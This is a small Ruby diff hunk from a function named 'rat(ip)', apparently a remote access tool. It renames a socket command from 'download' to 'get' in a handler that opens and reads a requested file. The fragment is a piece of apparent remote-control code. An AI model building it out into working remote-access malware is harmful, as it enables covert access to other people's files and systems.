@@ -20,7 +20,7 @@ def rat(ip)
           end
           socket.puts 'done'
         end
-      when 'download'
+      when 'get'
         file = File.open(file, 'r')
         content = file.read
         puts content
